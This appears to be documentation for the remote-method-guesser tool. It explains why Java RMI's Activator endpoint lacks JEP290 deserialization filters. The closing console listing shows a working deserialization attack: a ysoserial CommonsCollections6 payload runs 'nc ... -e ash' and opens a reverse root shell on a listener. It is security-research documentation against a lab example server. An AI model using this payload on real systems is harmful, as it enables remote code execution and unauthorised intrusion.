### Activator Action

----

**TL;DR** - The ``Activator`` is just another well known *RemoteObject* with a fixed ``ObjID`` and known *remote methods*. The reason why it
is interesting from an offensive perspective is, because it did never profit from *JEP290* and still uses no deserialization filters.
As it's only *remote method* ``activate`` takes a non primitive argument, it is a prime target for deserialization attacks.
Since version ``v3.1`` the *rmg-example-server* runs an ``Activator`` remote object on the ``9010`` registry port.

----

One crucial part of remote method invocation on *Java RMI* endpoints are *RemoteObjects*. A *RemoteObject* is basically an instance of
a class that is made available over the network. Each *RemoteObject* which is registered in the current runtime is associated with
a corresponding ``ObjID``. During an *RMI call*, the *RMI client* sends all required information for the call, together with the
``ObjID`` for the desired *RemoteObject* to the server. The server looks up the ``ObjID`` value and dispatches the call to the
corresponding *RemoteObject*.

*RMI clients* usually obtain the ``ObjID`` for a *RemoteObject* in two different ways:

  1. Well known *RemoteObjects* (those that are used for internal RMI communication), have fixed and well known ``ObjID`` values.
  2. Other *RemoteObjects* are usually obtained using the *RMI registry*, which provides the ``ObjID`` values during the lookup operation.

The two probably most well known *well known RemoteObjects* are the *RMI registry* (``ObjID = 0``) and the *distributed garbage collector* (``ObjID = 2``),
but there is one other well known *RemoteObject* that is no longer that well known. This *RemoteObject* is the *activator* (``ObjID = 1``)
that was (not sure if really true, but at least some references mention that) once a mandatory part of *Java RMI*, but became optional in
*Java 8* [1](https://openjdk.java.net/jeps/385). From here on, it was no longer commonly used and the amount of reliable documentation and
projects that still use it is quite low. From the small amount of documentation that is available [2](https://docs.oracle.com/javase/9/docs/specs/rmi/activation.html)
we conclude that the *activation system* is used for the following purpose:

It seems to allow the creation of *RemoteObjects* on demand. With regular *Java RMI*, the client obtains a *remote reference* from the
*RMI registry* that points to an existing *RemoteObject*. When the corresponding *RemoteObject* does not exist, regular *RMI calls* simply
lead to a ``ConnectException`` or ``NoSuchObjectException``. However, with an ``Activator`` present, the situation is a little bit different,
as clients obtain not only a *remote reference*, but also an ``ActivationID`` when looking up a *RemoteObject*.

The ``ActivationID`` can now be used to create *RemoteObjects* on demand. When a client dispatches a *RMI call*, it first tries to
dispatch it directly using the *remote reference* for the corresponding *Remote Object*. When this call fails, it sends an *activate
request* to the ``Activator``, containing the ``ActivationID`` it obtained previously. The ``Activator`` can now create the object
and return the new *remote reference* back to the client (as already mentioned, this explanation is probably not fully correct and
misses many details, but it is sufficient for our purpose).

For some reason (probably the deprecation) the *Activation system* was not updated when the deserialization filters proposed by
*JEP290* were introduced for the *RMI registry* and the *distributed garbage collector*. This is pretty unfortunate, as the single
method that is exposed by the activator takes a non primitive Argument and can therefore be abused for *deserialization attacks*:

```java
MarshalledObject<? extends Remote> activate(ActivationID id, boolean force) throws ActivationException, UnknownObjectException, RemoteException
```

The following listing shows an example how to perform a deserialization attack on an *activator* endpoint with *remote-method-guesser*:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 serial CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --component act 
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on Activation endpoint...
[+]
[+] 	Caught IllegalArgumentException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:41217.
id
uid=0(root) gid=0(root) groups=0(root)
```
